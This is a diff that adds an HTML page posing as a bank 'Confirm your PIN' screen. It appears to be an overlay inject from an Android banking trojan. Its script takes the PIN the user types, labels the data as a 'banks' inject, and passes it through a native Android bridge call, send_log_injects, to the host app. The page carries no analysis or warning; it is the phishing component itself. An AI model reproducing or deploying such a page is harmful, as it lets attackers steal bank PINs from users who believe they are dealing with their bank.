@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <style>
+        body {
+            background-color: #ebe9eb;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAA/CAIAAABFMI4AAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MjYwNEQ4RjM4RjExMTFFQkEyQkJFNTBDMDQ0REVBNTciIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MjYwNEQ4RjQ4RjExMTFFQkEyQkJFNTBDMDQ0REVBNTciPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoyNjA0RDhGMThGMTExMUVCQTJCQkU1MEMwNDRERUE1NyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoyNjA0RDhGMjhGMTExMUVCQTJCQkU1MEMwNDRERUE1NyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmhSgfUAAAB0SURBVHjafE9LFoAgEBqmVl2gbTfraF2056SOmthn4eMBAop1P0RkDkACg0ZIJzHNLIrZg4NID6bwm+haiqfEvKVWw6vdq2IZotzgtUcoeXaLrWWIy7OT3llEhlrGufATmF5mee914ausZ7D8zW05I1wCDAClkhVJfqrEmAAAAABJRU5ErkJggg==');
+            background-size: contain;
+            padding: 15px;
+            text-align: center;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        label {
+            font-weight: 600;
+            color: #3f72af;
+            font-size: 18px;
+            margin-bottom: 0;
+        }
+
+        .input {
+            width: 100%;
+            padding: 6px;
+            border: 1px solid #eceaec;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 8px;
+            background-color: #3f72af;
+            font-size: 18px;
+            color: #fff;
+        }
+
+        .button:disabled {
+            opacity: 0.4;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 12px;float: left;margin-top: 4px;margin-right: -12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAlCAIAAADTBG7hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MjYwNEQ4RUY4RjExMTFFQkEyQkJFNTBDMDQ0REVBNTciIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MjYwNEQ4RjA4RjExMTFFQkEyQkJFNTBDMDQ0REVBNTciPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoyNjA0RDhFRDhGMTExMUVCQTJCQkU1MEMwNDRERUE1NyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoyNjA0RDhFRThGMTExMUVCQTJCQkU1MEMwNDRERUE1NyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuNLocIAAAYPSURBVEjHlVbbbtzWFV1rn8PLXMgZCU5sWVGAGIpjpVJbpHBSK9f+SJ089uf6D0Ft5KlNLEWB4wtspbElxbZGM0POkEOes/vAGUt2mro+IPhAgotr7evi+b/9Ha9zlPM7FQC8qgGbVwawSuL1jiqVOscloQqAADxgXxMLAo2ErSi0RsZlWVXOER4NU1pS/l8ggupC+rXldHN9tR3a2w8ePXj8dFhrzUBpCFrgf4hVD4UIPADv1Xfo15eTa5urH7zXawd8u3v+pp/uHY4GTmsQ4CvFkgoQ8L5Fd2k5+Xhz9aON3lqfAdC+lIyGS0ejYjhu5L4iFTSkV6XWbYP1c0vbmyvXNnpv9aUDqMLQ0XtAASoJ0MpvwDnAgCSsdyGx/kbv082LH270315CrKDqIKt+uHt4e//gZFJ6aQtJyG/GTghR0vu24Tvnep9srny40VvrMwYAPR5Xu/cOv9l9ePcoz+oYxjQ49iVGVG2q1IJU3xa99Eb62dbFP19JVnsMCVEcj8rv7hze3N3/4XB6XMeVRIAAqnwxdgIF6RtA9bHFO8vdL/6wdm0juZiiRajqcVbu3j+6cevB7V+KgWsVJqppPOhJAJZzOAGo9IAaBaAd49ff7H62tfbJRrLSZUsAj2fZbOfewdff3t87nA61XQaxg1ElFtVrHSDKBpQqgBPvWgHfXel98bvVq1eSlYSxQL0ej4rv7h3cuLV/50k51PaEkVPrKGeDb0X5vKVVPbVqBbxycekvW6sfvdu+mLAtUI8nw/Lbu49v7OzvHU5P6nZhogpBUyCAAGiUWTUAKBCB975uW7y/svT51ltXL3dXE7QJKE7Gs517Bze//2nvcPLUtWa2U8H4RW0C+nzYWNJwHnvXC7mxeu7zrdWPLqcXutohCByPZv+88/jrnYd7B9kzH88krmAczFmgBTvYmmqUVO2G9vdr/U+3zv9pPV3ragTS62Bc/OvHx/+49XDvIPvFBaWJmzwCjUZ/toU8YQ0EUAOeX04/2Ljwx8vpha5GygCYzOp7+0ff7N6/fZAPXauyrRoBIDKnhrMtoBQDLwAFJH1o2QoRGx96CACwchhPZ+OinjpbS6gMKVZPh5D+updM99pfQSjoZrPIM42iXhK0LQ1hLG3QmjgzyGejwtUwjkYhc60vXSBA09m+7kgq6roej8aTadmJ414vDK1YI0k77Pd78Jplk7yoaoiSNajgc1QlHelJkqazfV0XXTGr6vE4L4oyjuM0CTuWoTCJbS/tCCQb5/m0qEFHCuQ0cJzLVsDE29eBpksISuHqQV7m0zoO46U0igMJDJM4SJKOENk4y6elh3gJPA1IDyj0VGzv4+ugkDSgUjxlUuswr6bTWScOlntxKxBr2GkF/aRN8GQ0zqd1DQMYiABKQkBLGtJ0t78U0OiCPAGgqOosm0zzMoyiXhpHVkKjaSvoJ3PV46KqQZIOaOqMIEHT3b5OnefGNHMaAHzh/GhS5JMqDsO0G8aBRAZJHKRJF+Qom+ZlNVOdRwkwoIKmu/1lw8rgtJhECDGV5zAv8nwW2qCXRO3QBAZpy6ZJl2Ce5fl05hQeBhSBKGC6218tmC5YEkp6GgdTOD8YTbPJrB1HS2ncDSUyTFq2n3YFHI4n2aSqFaSpKSBNd/urpgF52jEECIqCtYpTjCfldDqLo7DJTGDYb5l+P4HyZJRnRVVTHI2nNHCCs4mALiAhpKcpVcdZMcrKyAZLvTgKJBKksaRptyyrJ4N8OPOexpPWz4f72f0oDirabBHOAIPwqav3Ho+N/iTqr7537kJixWApMctp2A5EUClVecYFLFKuTZocYZplrL6mCILjmd99NDTeee+vvv9mJzb3/z24v380mkzBsJFoF+pe3raNa6OqAWvAgZUEx5XbeTR2+nNWIW0Hez/uf//w6bAQNfalPatnZ4570fiY+UMpJXzmq52jydPi58DgeDA8KU0hUYUAECqteYEXzdxOvADX/MUBnrakfeZ18KxU5wSBmlgZ1JDmW/tra/LfVKuDNqFUsAJIafYxyeeBalzAq7wrFICAbrE/azaFcGqJG59cE/8BqJrqFzYWyfEAAAAASUVORK5CYII=" alt="">
+            
+            <p style="margin-left: -12px;color: #fff;font-size: 18px;font-weight: 600;padding: 0;margin: 0;">Confirm your PIN</p>
+        </header>
+        <section>
+            <label for="pin"> PIN </label>
+            <input type="password" class="input" id="pin" name="pin" placeholder="Please enter a 4 digit PIN" maxlength="4" autocomplete="off">
+            
+            <label for="repeatPIN"> Confirm PIN </label>
+            <input type="password" class="input" id="repeatPin" name="repeatPin" placeholder="Please re-enter your 4 digit PIN" maxlength="4" autocomplete="off">
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="Next">
+        </footer>
+    </form>
+
+    <script>
+        $('#pin').mask('0000');
+        $('#repeatPin').mask('0000');
+
+        var repeatPin = document.getElementById('repeatPin'),
+            pin = document.getElementById('pin');
+
+        var sendData = document.getElementById('sendData');
+
+        function check(){
+            if(pin.value === repeatPin.value && pin.value.length != 0) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        pin.onkeyup = () => {
+            check();
+        }
+
+        repeatPin.onkeyup = () => {
+            check();
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.pin = pin.value;
+                data.repeatPin = repeatPin.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
